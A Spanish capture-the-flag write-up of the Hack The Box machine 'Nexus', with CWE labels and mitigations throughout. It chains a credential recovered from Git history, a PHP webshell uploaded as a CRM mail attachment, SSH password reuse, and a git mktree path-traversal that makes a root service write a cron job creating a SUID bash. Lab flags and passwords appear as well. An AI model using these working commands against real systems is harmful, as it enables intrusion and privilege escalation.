# Nexus — Hack The Box Writeup

| Campo | Valor |
|---|---|
| **Máquina** | Nexus (Linux) |
| **Plataforma** | HackTheBox |
| **Fecha** | 2026-08-24 |
| **user.txt** | `0f741c6366f6a2b4aaf24686ca4cb4a2` |
| **root.txt** | `80e617debab68bd25bfcdc75a031c05d` |

## TL;DR

Cadena de ataque en cuatro actos:

1. **Fuga de credenciales en el historial de Git** → una `DB_PASSWORD` "borrada" se recupera de un commit antiguo en Gitea.
2. **Reutilización de contraseñas** → la credencial filtrada da acceso como admin al panel del CRM (Krayin, Laravel).
3. **Unrestricted file upload** → webshell PHP subido como adjunto de un email vía API → RCE como `www-data`.
4. **Path traversal en script de sincronización corriendo como root** (timer systemd + repos *template* de Gitea) → escritura arbitraria en `/etc/cron.d/` → bash SUID → root.

---

## 1. Reconocimiento

### 1.1 Escaneo de puertos

```bash
nmap -Pn -n -sT --open --min-rate 5000 -p- 10.129.107.139 -oG allPorts
```

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

Detalle útil del ping: `ttl=63` → TTL inicial 64 (Linux) menos un salto → **máquina Linux**.

### 1.2 Fingerprinting web

```bash
nmap -Pn -n -sT -sC -sV -p22,80 10.129.107.139
```

```
80/tcp open  http  nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
```

El servidor usa **VirtualHosts**: añadimos los dominios a `/etc/hosts`:

```bash
echo "10.129.107.139 nexus.htb git.nexus.htb billing.nexus.htb" | sudo tee -a /etc/hosts
```

> ⚠️ Lección: sin las entradas correctas el navegador no resuelve y parece que "la web no funciona".

### 1.3 Descubrimiento de VirtualHosts

`gobuster dir` sobre `nexus.htb` solo devuelve la landing estática. Probamos vhosts:

```bash
gobuster vhost -u http://nexus.htb \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  --append-domain -t 50 --no-error
```

```
git.nexus.htb       Status: 200 [Size: 14474]      → Gitea
billing.nexus.htb   Status: 302 [--> /admin/login] → Panel de facturación
```

### 1.4 Identificación de tecnologías

```bash
whatweb -a 3 http://nexus.htb
# Email[j.matthew@nexus.htb]  ← usuario potencial
# Title: Nexus Energy Authority

curl -s http://git.nexus.htb | grep -i powered
# Powered by Gitea
```

El formulario de login de `billing` tiene hidden inputs `_token`, `base-url`, `currency-code` → patrón **Laravel**.

Mapa del objetivo:

```
10.129.107.139 (Ubuntu Linux)
├── 22/tcp  SSH (OpenSSH 9.6)
└── 80/tcp  nginx
     ├── nexus.htb         → landing corporativa
     ├── git.nexus.htb     → Gitea (repo público admin/krayin-docker-setup)
     └── billing.nexus.htb → Krayin CRM (Laravel), login /admin/login
```

---

## 2. Obtención de acceso (foothold)

### 2.1 Credenciales filtradas en el historial de Git

En Gitea existe el repo público `admin/krayin-docker-setup` con un `.env`. La versión actual tiene `DB_PASSWORD=` vacío... pero Git recuerda todo:

```bash
curl -s http://git.nexus.htb/admin/krayin-docker-setup/commits/branch/main/.env
# → dos commits: 1615c46... y 9b817fa...

curl -s http://git.nexus.htb/admin/krayin-docker-setup/raw/commit/1615c465b74e5d7ad3162873382dd8b3869ca892/.env \
  | grep DB_PASSWORD
# DB_PASSWORD=N27xh!!2ucY04
```

> 🔑 **Vulnerabilidad #1 — Secrets in repository history (CWE-798)**:
> borrar un secreto del último commit no lo elimina del historial. Mitigación: rotar la credencial inmediatamente y usar secret managers, nunca archivos versionados.

El `.env` confirma además que este repo es el setup de `billing.nexus.htb` (`APP_URL`) y que la app es **Krayin CRM** con `APP_DEBUG=true`.

### 2.2 Password reuse → panel admin

Probamos la credencial contra el panel (gestionando cookie de sesión + token CSRF):

```bash
TOKEN=$(curl -s -c jar http://billing.nexus.htb/admin/login \
        | grep -oP 'name="_token" value="\K[^"]+')
curl -s -b jar -c jar -d "_token=$TOKEN&email=j.matthew@nexus.htb&password=N27xh!!2ucY04" \
  http://billing.nexus.htb/admin/login -w "%{http_code} -> %{redirect_url}\n"
# 302 -> http://billing.nexus.htb/admin/dashboard  ✅ LOGIN VÁLIDO
```

> 🔑 **Vulnerabilidad #2 — Credential reuse (CWE-1392)**: la misma contraseña sirve para el CRM.

### 2.3 Unrestricted file upload vía adjuntos de correo

Explorando el panel autenticado encontramos errores `MethodNotAllowedHttpException` que filtran rutas válidas (`APP_DEBUG=true`). El endpoint real de composición es `POST /admin/mail/create`.

Requisitos descubiertos iterando sobre las respuestas `422`:

- Cabeceras `X-Requested-With: XMLHttpRequest` + `Accept: application/json` (si no, `401`)
- `reply_to` debe enviarse como **array** (`reply_to[]=`)

Subida del webshell:

```bash
printf '<?php system($_GET["c"]); ?>' > shell.php

curl -H "Host: billing.nexus.htb" -H "X-Requested-With: XMLHttpRequest" \
     -H "Accept: application/json" -b cookies.txt \
     -F "_token=$T" -F "to[]=attacker@evil.com" \
     -F "reply_to[]=j.matthew@nexus.htb" -F "subject=t" -F "reply=<p>x</p>" \
     -F "attachments[]=@shell.php;type=image/png" \
     http://billing.nexus.htb/admin/mail/create
```

Respuesta (HTTP 200 tras ~20s mientras Laravel intenta SMTP contra un host inexistente):

```json
{"data":{"id":5,"attachments":[{"name":"p_normal.php",
 "path":"emails/5/p_normal.php",
 "url":"http://billing.nexus.htb/storage/emails/5/p_normal.php"}]}}
```

> 🔑 **Vulnerabilidad #3 — Unrestricted file upload (CWE-434)**: Krayin guarda adjuntos sin validar extensión ni contenido.

### 2.4 RCE como www-data

```bash
curl "http://billing.nexus.htb/storage/emails/5/p_normal.php?c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 3. Movimiento lateral → user flag

### 3.1 El `.env` de producción (contraseña rotada)

Desde el webshell leemos el `.env` real del servidor:

```
APP_KEY=base64:n4swv+4YcBtCr1OPHBe69GxK06/X1y1vCQU1SIMIC7Q=
DB_PASSWORD=y27xb3ha!!74GbR     ← ¡distinta a la filtrada en Git!
```

La contraseña fue **rotada** tras la fuga (mismo patrón `xxxxxx!!yyyy`). Pero la gente reutiliza...

### 3.2 SSH como jones

```bash
sshpass -p 'y27xb3ha!!74GbR' ssh jones@10.129.107.139 id
# uid=1000(jones) gid=1000(jones) groups=1000(jones),100(users)
```

> 🔑 **Vulnerabilidad #4 — Reutilización local de contraseñas** (BD → cuenta del sistema).

### 3.3 User flag

```bash
jones@nexus:~$ cat ~/user.txt
0f741c6366f6a2b4aaf24686ca4cb4a2
```

---

## 4. Escalada de privilegios

### 4.1 Descubrimiento del timer sospechoso

```bash
systemctl list-timers --no-pager
# Mon ... 22s gitea-template-sync.timer  gitea-template-sync.service
```

Timer **custom** que corre cada minuto:

```ini
# /etc/systemd/system/gitea-template-sync.service
[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
```

### 4.2 Análisis del script

`template-sync.py` (legible por todos, `-rw-r--r-- git git`):

1. Lee un token de API de `/etc/gitea/template-sync.conf`
2. Consulta a la API local de Gitea los repos marcados como **template**
3. Para cada repo, ejecuta `git ls-tree -r HEAD` y `git cat-file blob <hash>` sobre el repo bare
4. Escribe cada archivo en `/home/git/template-staging/{owner}/{repo}/{filepath}` como **root**

```python
target = os.path.join(stage_path, filepath)   # filepath viene del árbol git
...
with open(target, 'wb') as f:                 # escritura SIN validar path
    f.write(cat_result.stdout)
```

**Bug lógico**: `filepath` proviene del árbol del repo y no se sanea. Si un repo template contiene un blob cuyo path contiene `../`, root escribirá fuera del directorio de staging.

### 4.3 Preparando el repositorio trampa

Como usuario `jones` (cuenta existente en Gitea con la misma contraseña), creamos un repo y lo marcamos como template:

```bash
curl -s -u "jones:y27xb3ha!!74GbR" -X POST http://127.0.0.1:3000/api/v1/user/repos \
  -H "Content-Type: application/json" -d '{"name":"tpl1","auto_init":true}'
curl -s -u "jones:y27xb3ha!!74GbR" -X PATCH http://127.0.0.1:3000/repos/jones/tpl1 \
  -H "Content-Type: application/json" -d '{"template":true}'
```

Tras el siguiente ciclo, el log confirma que root procesa nuestro repo:

```
[16:55:19] Found 1 template repo(s)
[16:55:19] Syncing template: jones/tpl1
[16:55:19]   synced: README.md
```

### 4.4 Path traversal mediante cirugía de objetos Git

Git rechaza `..` en paths durante operaciones normales (`add`/`commit`), pero **`git mktree` permite construir árboles arbitrarios** anotando entradas con nombres `..`, y los hooks `pre-receive` de Gitea no realizan validación completa (`fsck`).

Construimos el árbol anidado para el path `../../../../../../etc/cron.d/sync-pwn`:

```bash
CRON='* * * * * root cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash'
FP='../../../../../../etc/cron.d/sync-pwn'

BLOB=$(echo "$CRON" | git hash-object -w --stdin)

IFS='/' read -ra P <<< "$FP"
T=$(printf '100644 blob %s\t%s\n' "$BLOB" "${P[-1]}" | git mktree)
for ((i=${#P[@]}-2; i>=0; i--)); do
  T=$(printf '040000 tree %s\t%s\n' "$T" "${P[i]}" | git mktree)
done

COMMIT=$(GIT_AUTHOR_NAME=a GIT_AUTHOR_EMAIL=a@a.a \
         GIT_COMMITTER_NAME=a GIT_COMMITTER_EMAIL=a@a.a \
         git commit-tree "$T" -p HEAD -m sync)

git push -f origin "$COMMIT:refs/heads/main"
# e594380..7c97276  -> main   ✅ aceptado
```

Conteo de niveles: desde `/home/git/template-staging/jones/tpl1`, seis `..` alcanzan `/`.

### 4.5 Root escribe nuestro cron

Log tras el ciclo siguiente:

```
[16:01:19]   synced: ../../../../../../etc/cron.d/sync-pwn
```

Verificación:

```bash
cat /etc/cron.d/sync-pwn
# * * * * * root cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
ls -la /tmp/rootbash
# -rwsr-xr-x 1 root root 1446024 ...
```

### 4.6 Shell root

```bash
/tmp/rootbash -p -c id
# uid=1000(jones) euid=0(root)

/tmp/rootbash -p -c 'cat /root/root.txt'
# 80e617debab68bd25bfcdc75a031c05d
```

> 🔑 **Vulnerabilidad #5 — Escritura arbitraria como root por path traversal (CWE-22 + CWE-250)**:
> un servicio privilegiado procesa datos controlados por usuarios (contenido de repos Gitea) sin validar rutas.
> Mitigaciones: validar/rejectar `..` en `filepath`, confinar el servicio con `ProtectSystem=strict` /
> `ReadWritePaths=/home/git/template-staging`, ejecutarlo con usuario sin privilegios, y activar
> `fsckObjects` / validación server-side de paths en Git.

---

## 5. Resumen de vulnerabilidades

| # | Vulnerabilidad | CWE | Impacto |
|---|---|---|---|
| 1 | Secretos en historial de Git | CWE-798 | Credencial de BD expuesta públicamente |
| 2 | Reutilización de contraseñas entre sistemas | CWE-1392 | Acceso admin al CRM |
| 3 | Subida de archivos sin restricción | CWE-434 | RCE como www-data |
| 4 | Contraseña de BD = contraseña de SSH | CWE-1392 | Acceso como jones |
| 5 | Path traversal en servicio root (timer) | CWE-22 | Escalada a root |
| — | `APP_DEBUG=true` en producción | CWE-489 | Filtración de rutas internas y stack traces |

## 6. Artefactos

- `scripts/krayin_login.sh` — login CSRF-aware contra el panel
- `scripts/upload_attack.sh` — subida del webshell vía API de mail
- `scripts/mktree_traversal.sh` — construcción del árbol malicioso y push
- `scripts/ssh_brute.py` — prueba de credenciales SSH vía PTY

## 7. Limpieza post-explotación

```bash
rm -f /etc/cron.d/sync-pwn /tmp/rootbash /tmp/cronpayload
# Borrar repo jones/tpl1 en Gitea
```
